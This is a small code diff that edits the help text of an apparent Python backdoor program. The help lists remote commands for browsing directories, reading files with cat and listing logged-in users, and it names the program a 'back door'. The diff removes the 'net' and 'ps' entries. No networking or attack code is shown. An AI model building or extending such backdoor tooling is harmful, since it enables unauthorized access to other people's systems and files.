@@ -41,7 +41,7 @@ def cd_com(relPath):
 def hlp_com():
     return ("pwd - returns current working directory\ncd <dir> - changes current working directory to <dir>\n"
             + "ls - list content of the current working directory\ncat <file> - return contents of the file\n"
-            +"who - list user[s] currently logged in\nnet - show the network configuration\nps - show the currently running processes\n"
+            +"who - list user[s] currently logged in\n"
             +"off - terminates the back door program\n")
 
 def who_com():
